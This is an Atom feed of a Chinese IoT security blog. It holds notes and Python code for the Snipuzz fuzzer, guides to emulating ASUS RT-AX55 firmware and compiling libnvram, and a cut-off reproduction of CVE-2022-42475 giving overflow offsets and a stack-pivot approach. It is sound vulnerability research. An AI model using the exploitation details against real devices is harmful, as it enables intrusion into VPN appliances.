<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ioo0s&#39;s blog</title>
  
  
  <link href="http://ioo0s.art/atom.xml" rel="self"/>
  
  <link href="http://ioo0s.art/"/>
  <updated>2023-02-21T01:32:39.434Z</updated>
  <id>http://ioo0s.art/</id>
  
  <author>
    <name>ios</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Snipuzz</title>
    <link href="http://ioo0s.art/2023/02/21/Snipuzz/"/>
    <id>http://ioo0s.art/2023/02/21/Snipuzz/</id>
    <published>2023-02-21T01:20:16.000Z</published>
    <updated>2023-02-21T01:32:39.434Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="Iot-通用的通信架构"><a href="#Iot-通用的通信架构" class="headerlink" title="Iot 通用的通信架构"></a>Iot 通用的通信架构</h3><p>为了与设备外的输入进行交互，大多数物联网设备实现了类似的高级通信体系结构（如下图）。主要分为以下几个部分</p><ol><li>Sanitizer</li></ol><p>接收外部的输入后对输入进行过滤（安全检查）、匹配（白名单检查）、解析（找出功能命令和执行内容），如果不满足任意一种情况，则会返回带有错误信息的响应结果（跳转到 Replier 处理），否则将匹配到的功能命令送入下一步。</p><span id="more"></span><ol start="2"><li>Function Switch</li></ol><p>将 Sanitizer 中获取到的指令，进行功能(不单指函数)的匹配。如果成功匹配到对应的功能，则将通过 Sanitizer 中获取到的执行内容发送到下一步进行处理，否则返回带有错误信息的响应结果（跳转到 Replier 处理）。</p><ol start="3"><li>Function Definitions</li></ol><p>此部分主要是对具体功能的实现，根据 <code>Function Switch</code> 选择调用的功能，对输入进行具体的执行，并将结果返回到响应信息中（跳转到 Replier 处理）</p><ol start="4"><li>Replier</li></ol><p>具体实现了一个响应功能，统一处理在整个通信过程中的响应信息转换，最终反馈到输入设备中。</p><p><img src="/2023/02/21/Snipuzz/boxcnD7qcJ92dJtYDOAa8Etppp5.png"></p><h2 id="Implement"><a href="#Implement" class="headerlink" title="Implement"></a>Implement</h2><h3 id="Response-Based-Feedback-Mechanism"><a href="#Response-Based-Feedback-Mechanism" class="headerlink" title="Response-Based Feedback Mechanism"></a>Response-Based Feedback Mechanism</h3><p>基于响应的反馈机制，传统的黑盒 Fuzz 测试总是需要对 Binary 进行 Patch 实现反馈，或者像 AFL++ 利用 qemu 实现反馈。传统的黑盒 Fuzz 在对 Iot 设备测试时会遇到无法提取固件或者环境依赖过于庞大（例如像 Lina）使用 qemu 模式进行 Fuzz 的成本太大，Patch 固件更复杂的情况。此时传统的方法就不太适用于 Iot 设备上进行 Fuzz 测试。</p><p>Snipuzz 使用响应消息建立新的反馈机制。 Snipuzz 会收集每一个响应，当找到新的响应时，该响应对应的输入将作为种子排队，用于后续的变异测试</p><h3 id="Message-Snippet-Inference"><a href="#Message-Snippet-Inference" class="headerlink" title="Message Snippet Inference"></a>Message Snippet Inference</h3><p>消息片段推断，传统的变异方法（字节翻转、字节添加、字节突变等）不太适用于 IOT 设备的 Fuzz 测试中。在 Iot 设备中，通常有较为严格输入规范，也会采用一些格式进行规范，例如 JSON、SOAP、键值对等，传统的变异方式可能会破坏这些格式规范，导致不能有效的提高路径覆盖率。</p><p>根据下表，如果我们逐字节地改变有效消息（即破坏格式），将得到许多不同的响应。 有效消息中两个不同位置的变异，如果收到相同的响应，则这两个位置很可能出自固件中的同一个功能中。 因此，可以将具有相同响应的那些连续字节合并为一个片段。同时也可以在片段中进行变异，这样可以极大的提高变异覆盖率。</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><h3 id="Message-Sequence-Acquisition"><a href="#Message-Sequence-Acquisition" class="headerlink" title="Message Sequence Acquisition"></a>Message Sequence Acquisition</h3><p>消息序列的获取，通过设备的 API 文档、或者对设备进行功能性的抓包获得，例如，可以在设备登陆后，开启抓包工具，用户与设备进行交互得到一些功能性的数据包。</p><h3 id="Snippet-Determination"><a href="#Snippet-Determination" class="headerlink" title="Snippet Determination"></a>Snippet Determination</h3><h5 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h5><p><strong>消息片段分类</strong>：利用启发式搜索和层次聚类的方式</p><p>Snipuzz 利用启发式算法和层次聚类方法来确定每条消息中的片段。消息片段的本质是消息中的连续字节，使固件能够执行特定的代码段。使用自动化的方式来识别消息中每个字节的含义。</p><p>使用启发式算法，对每一个 Request 粗略的划分初始片段。通过删除 Request Body 部分（测试中的 content）中的某个字节，生成一个新的消息，称为探测消息。对每个探测消息的响应进行归类，同时将初步划分的某个字节合并为同一种触发类型。</p><p><img src="/2023/02/21/Snipuzz/boxcn3qynjs1BLiVSgBrRwb0PUh.png"></p><p>如图中，将相同响应结果的请求 message 划分为一种类型。</p><h4 id="如何归类"><a href="#如何归类" class="headerlink" title="如何归类"></a>如何归类</h4><p>本文使用了 <code>Edit Dis-tance</code> 编辑距离作为计算方式，计算出两个响应结果间的相似度，通过比较响应池中的每一个响应与当前目标响应的相似度，与曾经放入响应池时的相似度进行比较，分数低于时确定为不同响应则放入新的响应到响应池中，并记录此时的分数，否则进行下一轮比较，以此为归类方式。</p><p><img src="/2023/02/21/Snipuzz/boxcnsZR826mlkwA5nrOADvzHQb.png"></p><p>其中 rk、rt 为两个响应，max_len 为最大长度计算公式</p><h5 id="编辑距离代码"><a href="#编辑距离代码" class="headerlink" title="编辑距离代码"></a>编辑距离代码</h5><pre><code>def EditDistanceRecursive(str1, str2):    edit = [[i + j for j in range(len(str2) + 1)] for i in range(len(str1) + 1)]    for i in range(1, len(str1) + 1):        for j in range(1, len(str2) + 1):            if str1[i - 1] == str2[j - 1]:                d = 0            else:                d = 1            edit[i][j] = min(edit[i - 1][j] + 1, edit[i][j - 1] + 1, edit[i - 1][j - 1] + d)    return edit[len(str1)][len(str2)]</code></pre><h5 id="相似度计算代码"><a href="#相似度计算代码" class="headerlink" title="相似度计算代码"></a>相似度计算代码</h5><pre><code>def SimilarityScore(str1, str2):    ED = EditDistanceRecursive(str1, str2)    return round((1 - (ED / max(len(str1), len(str2)))) * 100, 2)</code></pre><h5 id="归类实现代码"><a href="#归类实现代码" class="headerlink" title="归类实现代码"></a>归类实现代码</h5><pre><code>response1 = m.ProbeSend(Seed, index)  # send the probe message   #######time.sleep(1)response2 = m.ProbeSend(Seed, index)  # send the probe message twiceprint(response1, end=&quot;&quot;)if responsePool:    flag = True    for j in range(0, len(responsePool)):        target = responsePool[j]        score = similarityScore[j]        # c = 计算当前请求的响应与响应池中的每一个响应的相似度        c = SimilarityScore(target.strip(), response1.strip())         # 如果相似分数大于之前目标的分数则记录当前的index，并且继续循环        if c &gt;= score:             flag = False            probeResponseIndex.append(j)            print(str(j) + &quot; &quot;, end=&quot;&quot;)            sys.stdout.flush()            break    # 如果当前相似度得分小于之前目标的分数，则把当前不同的响应结果放入响应池，同时记录分数    if flag:        # 放入响应池        responsePool.append(response1)        # 记录此时的相似度并添加到分数池中        similarityScore.append(            SimilarityScore(response1.strip(), response2.strip())        )        probeResponseIndex.append(j + 1)        # print(j + 1)  # test only</code></pre><h4 id="Hierarchical-Clustering"><a href="#Hierarchical-Clustering" class="headerlink" title="Hierarchical Clustering"></a>Hierarchical Clustering</h4><p>层次聚类，当出现当前响应池中响应的相似性分数为 1，当前目标响应与目标响应的相似性分数为 0.99 时，也满足上述的归类标准，会被放入到进程池中。但事实上这两种响是同一类响应，为了解决该问题，本文引入了层次聚类算法来细化消息片段。</p><p>层次聚类的核心思想是不断合并最相似的两个簇，直到只剩下一个簇。</p><p>层次聚类算法将数据集划分为一层一层的 clusters，后面一层生成的 clusters 基于前面一层的结果</p><p>本文采用欧氏距离作为样本间的距离</p><p>合并规则：簇间的距离最小时合并</p><p>合并停止条件：簇的个数为 1 时,停止合并</p><h5 id="聚合聚类算法流程："><a href="#聚合聚类算法流程：" class="headerlink" title="聚合聚类算法流程："></a>聚合聚类算法流程：</h5><p>输入: n 个样本组成的样本集合及样本之间的距离</p><p>输 出 : 对样本集合的层次化聚类</p><ol><li>计算 n 个样本中两两之间的欧氏距离</li><li>构造 n 个簇，每个簇只包含一个样本</li><li>合井簇间距离最小的两个簇，其中最短距离为簇间距离，构建一个新簇</li><li>计算新簇与当前各簇的距离。若簇的个数为 1，终止计算，否则回到步骤 3</li></ol><h5 id="欧式距离计算公式："><a href="#欧式距离计算公式：" class="headerlink" title="欧式距离计算公式："></a>欧式距离计算公式：</h5><p>$$<br>0ρ = sqrt( (x1-x2)^2+(y1-y2)^2<br>$$</p><p>例如：输入向量[ [“{&quot;“,1],[“o”, 2],[“n”, “3”],[“&quot;:true}”, 1] ]，通过 <code>hierarchy.linkage(input_vec, method=&quot;average&quot;, metric=&quot;euclidean&quot;)</code> 实现聚类，首先会将 字符 <code>o</code> 与字符 <code>n</code> 进行聚类（因为字符 o 与 n 的距离最近 ），得到了此时的簇为[ [“{&quot;“,1],[“on”, 4],[“&quot;:true}”, 1] ],接着继续合并，最终得到一个簇，结果为 [“{&quot;on&quot;:true}”, 5]</p><h5 id="例图"><a href="#例图" class="headerlink" title="例图"></a>例图</h5><p><img src="/2023/02/21/Snipuzz/boxcnFQviQPgzcPPSOBp2D7UN9b.png"></p><h5 id="算法伪代码"><a href="#算法伪代码" class="headerlink" title="算法伪代码"></a>算法伪代码</h5><p><img src="/2023/02/21/Snipuzz/boxcnWUUU3XEBukrDKJ9eAKopRg.png"></p><h3 id="Mutation-Schemes"><a href="#Mutation-Schemes" class="headerlink" title="Mutation Schemes"></a>Mutation Schemes</h3><p>突变的核心思想：以消息片段为基本单位，对消息片内部段进行 <code>字节翻转</code>、<code>清空</code>、<code>数据类型及边界替换</code> 、<code>字典替换</code>、<code>消息重复</code> 的操作。</p><h4 id="片段变异代码"><a href="#片段变异代码" class="headerlink" title="片段变异代码"></a>片段变异代码</h4><h5 id="获取片段代码"><a href="#获取片段代码" class="headerlink" title="获取片段代码"></a>获取片段代码</h5><pre><code># 检测片段边界，以及类型def formSnippets(pi, cluster, index):    snippet = []    for i in range(index):        c1 = int(cluster[i][0]) #当前簇        c2 = int(cluster[i][1]) #当前簇        p = int(cluster[i][3])  #合并后新簇的样本个数        for j in range(len(pi)):            if pi[j] == c1 or pi[j] == c2:                pi[j] = p    i = 0    while i &lt; len(pi) - 1:        j = i        # print(&quot;i=&quot;+str(i)) # test only        skip = True        while j &lt;= len(pi) and skip:            j = j + 1            # print(&quot;j=&quot; + str(j))  # test only            if pi[j] != pi[i]:                snippet.append([i, j - 1])                skip = False            if j == len(pi) - 1:                snippet.append([i, j])                skip = False        i = j    # print(pi)  # test only    # print(snippet)   # test only    return snippet</code></pre><h5 id="片段变异完整代码"><a href="#片段变异完整代码" class="headerlink" title="片段变异完整代码"></a>片段变异完整代码</h5><pre><code>def SnippetMutate(seed, restoreSeed):    # 初始化一个消息交互类    m = Messenger(restoreSeed)    循环所有的消息    for i in range(len(seed.M)):        # 响应池        pool = seed.PR[i]        # 响应对应表        poolIndex = seed.PI[i]        # 相似度分数表        similarityScores = seed.PS[i]                # 将响应与分数对应        featureList = []        for j in range(len(pool)):            featureList.append(getFeature(pool[j].strip(), similarityScores[j]))                # 初始化一个二维的panda的数据向量        df = pd.DataFrame(featureList)        # 层次聚类，UPGMA算法（非加权组平均）法，欧几里得距离        cluster = hierarchy.linkage(df, method=&quot;average&quot;, metric=&quot;euclidean&quot;)        # print(&quot;Cluster:&quot;)        # print(cluster)        # seed.display()        # 添加到簇列表        seed.ClusterList.append(cluster)        mutatedSnippet = []        for index in range(len(cluster)):            # 根据聚类得到的新簇（包含最终的字符）            snippetsList = formSnippets(poolIndex, cluster, index)            for snippet in snippetsList:                # 判断处理后的字符串是否在突变字符串中                if snippet not in mutatedSnippet:                    mutatedSnippet.append(snippet)                    tempMessage = seed.M[i].raw[&quot;Content&quot;]                    # ========  BitFlip ========                    print(&quot;--BitFlip&quot;)                    message = seed.M[i].raw[&quot;Content&quot;]                    asc = &quot;&quot;                    for o in range(snippet[0], snippet[1]):                        # print(255-ord(message[o]))                        asc = asc + (chr(255 - ord(message[o])))                    # message[o] = chr(255-ord(chr(message[o])))                    message = message[: snippet[0]] + asc + message[snippet[1] + 1:]                    seed.M[i].raw[&quot;Content&quot;] = message                    responseHandle(seed, m.SnippetMutationSend(seed, i))                    seed.M[i].raw[&quot;Content&quot;] = tempMessage                    # ========  Empty ========                    print(&quot;--Empty&quot;)                    message = seed.M[i].raw[&quot;Content&quot;]                    message = message[: snippet[0]] + message[snippet[1] + 1:]                    seed.M[i].raw[&quot;Content&quot;] = message                    responseHandle(seed, m.SnippetMutationSend(seed, i))                    seed.M[i].raw[&quot;Content&quot;] = tempMessage                    # ========  Repeat ========                    print(&quot;--Repeat&quot;)                    message = seed.M[i].raw[&quot;Content&quot;]                    t = random.randint(2, 5)                    message = (                            message[: snippet[0]]                            + message[snippet[0]: snippet[1]] * t                            + message[snippet[1] + 1:]                    )                    seed.M[i].raw[&quot;Content&quot;] = message                    responseHandle(seed, m.SnippetMutationSend(seed, i))                    seed.M[i].raw[&quot;Content&quot;] = tempMessage                    # ========  Interesting ========                    print(&quot;--Interesting&quot;)                    interestingString = [&quot;on&quot;, &quot;off&quot;, &quot;True&quot;, &quot;False&quot;, &quot;0&quot;, &quot;1&quot;]                    for t in interestingString:                        message = seed.M[i].raw[&quot;Content&quot;]                        message = message[: snippet[0]] + t + message[snippet[1] + 1:]                        seed.M[i].raw[&quot;Content&quot;] = message                        responseHandle(seed, m.SnippetMutationSend(seed, i))                        seed.M[i].raw[&quot;Content&quot;] = tempMessage        seed.Snippet.append(mutatedSnippet)    return 0</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Snipuzz 通过启发式搜索、相似度计算、层次聚类的方式实现功能的广度覆盖，但仍然存在一定的不足， 没有对不同类型的协议进行针对性的处理，相似度计算法也不够优秀，变异方式过于单一等。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Background&quot;&gt;&lt;a href=&quot;#Background&quot; class=&quot;headerlink&quot; title=&quot;Background&quot;&gt;&lt;/a&gt;Background&lt;/h2&gt;&lt;h3 id=&quot;Iot-通用的通信架构&quot;&gt;&lt;a href=&quot;#Iot-通用的通信架构&quot; class=&quot;headerlink&quot; title=&quot;Iot 通用的通信架构&quot;&gt;&lt;/a&gt;Iot 通用的通信架构&lt;/h3&gt;&lt;p&gt;为了与设备外的输入进行交互，大多数物联网设备实现了类似的高级通信体系结构（如下图）。主要分为以下几个部分&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Sanitizer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接收外部的输入后对输入进行过滤（安全检查）、匹配（白名单检查）、解析（找出功能命令和执行内容），如果不满足任意一种情况，则会返回带有错误信息的响应结果（跳转到 Replier 处理），否则将匹配到的功能命令送入下一步。&lt;/p&gt;</summary>
    
    
    
    <category term="论文学习" scheme="http://ioo0s.art/categories/%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="Fuzz" scheme="http://ioo0s.art/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>RT-AX55环境搭建</title>
    <link href="http://ioo0s.art/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://ioo0s.art/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2023-02-20T01:59:59.000Z</published>
    <updated>2023-02-20T02:03:17.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><pre><code>sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./libnvram.so&quot; ./usr/sbin/httpd</code></pre><span id="more"></span><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><ol><li>复制 qemu-arm-static 到 squashfs-root 中</li></ol><pre><code>where qemu-arm-staticcp /usr/bin/qemu-arm-static ./squashfs-root/</code></pre><ol><li>启动</li></ol><pre><code>cd squashfs-rootsudo chroot . ./qemu-arm-static ./usr/sbin/httpd</code></pre><h3 id="启动时的错误处理"><a href="#启动时的错误处理" class="headerlink" title="启动时的错误处理"></a>启动时的错误处理</h3><h4 id="遇见-openssl-相关错误"><a href="#遇见-openssl-相关错误" class="headerlink" title="遇见 openssl 相关错误"></a>遇见 openssl 相关错误</h4><p>错误原因代码：</p><p>运行 gencert.sh</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnvKJ5i51SRuJqtb1UGIJabf.png"></p><p>在调用 nvram 相关命令时出错，原因不存在 nvram</p><pre><code>#!/bin/shSECS=1262278080cd /etcNVCN=`nvram get https_crt_cn`if [ &quot;$NVCN&quot; == &quot;&quot; ]; then        NVCN=&quot;router.asus.com&quot;ficp -L openssl.cnf openssl.configI=0for CN in $NVCN; do        echo &quot;$I.commonName=CN&quot; &gt;&gt; openssl.config        echo &quot;$I.commonName_value=$CN&quot; &gt;&gt; openssl.config        I=$(($I + 1))done........ 以上是部分代码</code></pre><p>报错截图：</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnl3dulqHfHWoU4hPu8AxK6c.png"></p><h5 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h5><p>nvram 中保存了设备的一些配置信息，而程序运行时需要读取配置信息，由于缺少对应的外设，因此会报错。要编译 nvram 文件，可以使用 Firmadyne 提供的 libnvram 库，因为其支持很多的 api。</p><p><a href="https://ioo0s.art/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/">libnvram.so 编译</a></p><h4 id="libnvram-运行中其他错误"><a href="#libnvram-运行中其他错误" class="headerlink" title="libnvram 运行中其他错误"></a>libnvram 运行中其他错误</h4><p>运行后，发现仍然缺少一些键值对，</p><p>错误截图：</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcndvxlJcQMG25ouQzRdwrwSc.png"></p><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>返回修改 libnvarm 的 config.h 文件添加对应的键值对</p><p>通过 ida 中 strings 搜索对应的 key 进行 value 的查找</p><p>time_zone_x</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnCanMJ27GB8hlgZsJuAcWfc.png"></p><p>value</p><pre><code>PST8PDT</code></pre><p>HTTPD_DBG</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnHLGlcIPJuI1HotrIZhMaIe.png"></p><p>Value</p><pre><code>0 or 1</code></pre><p>https_crt_gen</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnDlsWW2oaMlwoBYKuiNJvS0.png"></p><p>Value</p><pre><code>0 or 1</code></pre><p>https_crt_save</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcn2qNTiJLAlCDobc2IIyOR1c.png"></p><p>Value</p><pre><code>0 or 1</code></pre><p>修改后</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnaD7h9vCpuz7WOzzM80upwf.png"></p><h4 id="nvram-init-Unable-to-touch-Ralink-PID-file-var-run-nvramd-pid"><a href="#nvram-init-Unable-to-touch-Ralink-PID-file-var-run-nvramd-pid" class="headerlink" title="nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!"></a>nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!</h4><p>错误截图：</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnTpbPxxZFdfeOvlEs05gjJh.png"></p><h5 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h5><p>手动 touch 一个文件进去</p><pre><code>touch var/run/nvramd.pid</code></pre><h4 id="cp-can’t-stat-‘-mnt-libnvram-override-’-No-such-file-or-directory"><a href="#cp-can’t-stat-‘-mnt-libnvram-override-’-No-such-file-or-directory" class="headerlink" title="cp: can’t stat ‘/mnt/libnvram.override/*’: No such file or directory"></a>cp: can’t stat ‘/mnt/libnvram.override/*’: No such file or directory</h4><p>一样创建一个</p><pre><code>mkdir mnt/libnvram.override</code></pre><h4 id="ssl-相关错误，例如-lib-2-func-1-reason-2-NA-0-fopen-‘-etc-cert-pem’-’r’-等一系列问题"><a href="#ssl-相关错误，例如-lib-2-func-1-reason-2-NA-0-fopen-‘-etc-cert-pem’-’r’-等一系列问题" class="headerlink" title="ssl 相关错误，例如 lib(2):func(1):reason(2):NA:0:fopen(‘/etc/cert.pem’,’r’) 等一系列问题"></a>ssl 相关错误，例如 lib(2):func(1):reason(2):NA:0:fopen(‘/etc/cert.pem’,’r’) 等一系列问题</h4><h5 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h5><p>根据错误搜索/etc/cert.pem</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnMx8s3873k7745ii1x40hmd.png"></p><p>通过分析上下文 + 本地文件生成可以知道，脚本 gencert.sh 并没有良好工作，需要我们在本地利用 openssl 生成对应的文件并 copy 到 etc 文件夹下即可</p><ol><li>生成 privkey.pem 及 cert.csr</li></ol><pre><code>openssl req -new -out /tmp/cert.csr -keyout /tmp/privkey.pem -newkey rsa:2048 -passout pass:password</code></pre><ol><li>生成 key.pem</li></ol><pre><code>openssl rsa -in /tmp/privkey.pem -out key.pem -passin pass:password</code></pre><ol><li>生成 cert.pem</li></ol><pre><code>RANDFILE=/dev/urandom openssl req -x509 -new -nodes -in /tmp/cert.csr -key key.pem -days 3653 -sha256 -out cert.pem</code></pre><ol><li>生成 server.pem</li></ol><pre><code>cat key.pem cert.pem &gt; server.pem</code></pre><ol><li>复制到/tmp/etc/下</li></ol><pre><code>cp server.pem cert.pem cert.crt key.pem ./tmp/etc</code></pre><p>再次运行 搞定</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;启动方式&quot;&gt;&lt;a href=&quot;#启动方式&quot; class=&quot;headerlink&quot; title=&quot;启动方式&quot;&gt;&lt;/a&gt;启动方式&lt;/h2&gt;&lt;h3 id=&quot;方式一&quot;&gt;&lt;a href=&quot;#方式一&quot; class=&quot;headerlink&quot; title=&quot;方式一&quot;&gt;&lt;/a&gt;方式一&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&amp;quot;./libnvram.so&amp;quot; ./usr/sbin/httpd
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="ASUS" scheme="http://ioo0s.art/tags/ASUS/"/>
    
  </entry>
  
  <entry>
    <title>libnvram.so编译教程</title>
    <link href="http://ioo0s.art/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/"/>
    <id>http://ioo0s.art/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/</id>
    <published>2023-02-20T01:29:15.000Z</published>
    <updated>2023-02-20T01:37:54.787Z</updated>
    
    <content type="html"><![CDATA[<ol><li>使用交叉编译环境</li><li>进行符号链接配置</li></ol><pre><code>sudo ln -s ~/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3 /opt/brcm-armecho &quot;PATH=\$PATH:/opt/brcm-arm/bin&quot; &gt;&gt; ~/.profilesource ~/.profile</code></pre><span id="more"></span><ol><li>下载 libnvram 项目</li><li>配置编译相关依赖</li></ol><pre><code>export CC=arm-uclibc-gcc&lt;em&gt;export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/opt/brcm-arm/lib:/usr/local/lib:/usr/lib&lt;/em&gt;</code></pre><ol start="5"><li>使用 ldd 命令查看依赖是否补全</li></ol><pre><code>ldd arm-uclibc-gcc</code></pre><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcnI29TiwEnChYepLkxqsjkuh.png"></p><p>发现还缺少 libelf 库，<strong>32 位版本</strong></p><ol><li>对 kali 添加 32 架构支持</li></ol><pre><code>sudo dpkg --add-architecture i386sudo apt update</code></pre><ol><li>安装 libelf1:i386</li></ol><pre><code>sudo apt-get install libelf1:i386</code></pre><ol><li>修改 config.h 中的配置文件</li></ol><p>为了初始化 nvram 时能够正确的配置信息，需要对 config.h 修改</p><p>修改图中参数为 eth0 网卡 ip 地址与广播地址</p><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcnCoz7jxnEDvRcZTXUGqy4Wc.png"></p><p>修改挂载点，修改后需要在文件系统中创建目录 <code>mkdir ./mnt/libnvram</code></p><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcnGvWyu3Hn0fgI6TQfz5oSmb.png"></p><p>如果需要加其他 nvram 的启动配置参数，也在这里进行添加</p><ol><li>尝试编译</li></ol><pre><code>make</code></pre><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcntGWsN5d5TDcqxPCjIHaGRh.png"></p><p>提示一个 warning</p><ol><li>修改 Makefile，添加 gnu，修复 warning</li></ol><pre><code>-D_GNU_SOURCE</code></pre><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcn7Kw93iKU1n89tekpUgJ9Uf.png"></p><p>9.再次编译，大功告成</p><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcndV2iixPchqAVePmZz7c6Be.png"></p>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;使用交叉编译环境&lt;/li&gt;
&lt;li&gt;进行符号链接配置&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;sudo ln -s ~/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3 /opt/brcm-arm
echo &amp;quot;PATH=\$PATH:/opt/brcm-arm/bin&amp;quot; &amp;gt;&amp;gt; ~/.profile
source ~/.profile
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="ASUS" scheme="http://ioo0s.art/tags/ASUS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-42475</title>
    <link href="http://ioo0s.art/2023/02/09/CVE-2022-42475/"/>
    <id>http://ioo0s.art/2023/02/09/CVE-2022-42475/</id>
    <published>2023-02-09T03:24:40.000Z</published>
    <updated>2023-02-09T05:10:47.206Z</updated>
    
    <content type="html"><![CDATA[<p>首先需要进行环境搭建参考<a href="https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/">获取 shell 进阶</a></p><p>以及调试环境搭建 <a href="https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/">gdb-server 配置</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>根据文章 <a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a>，可以快速定位到可控制的溢出点，但是不同环境的原因 貌似溢出点地址有变，例如我 init 中在 <code>0000000001780BFB</code></p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png"></p><p>调试 exp 时建议在此处下断点，不是百分百触发该位置，因为有时会覆盖到其他 结构位置 在赋值时导致错误。</p><span id="more"></span><ol><li>确定溢出偏移</li></ol><p>为了快速确定偏移，这里建议用 peda 的 pattern 生成 Payload 进行触发</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcntv3SPMSPz4RcHJJPCKzQZb.png"></p><p>接着当断点触发在 jmp rax 的时候，查看当前 rax 的值计算 offset，通过大量测试基本会存在两种情况偏移会触发到 jmp rax，</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnHQAyBPb7XieHeSWb6b8W0d.png"></p><p>分别是 2592,1568，并且 2592 偏移触发几率大于 1568，所以接下来的 exp 构造均在 2592 处，此时我们就可以通过 2592+payload 来控制跳转了</p><ol><li>栈迁移</li></ol><p>由于此时是堆溢出，只能控制一次跳转，我们需要利用栈迁移将栈地址移动到我们可控的位置，通过寄存器信息可以知道目前被溢出的位置有以下几个寄存器，RAX 用来栈迁移，RDX 可控，内容是溢出的字符（截图是 exp 构造后的），R11 可控，内容是溢出字符。</p><p><img 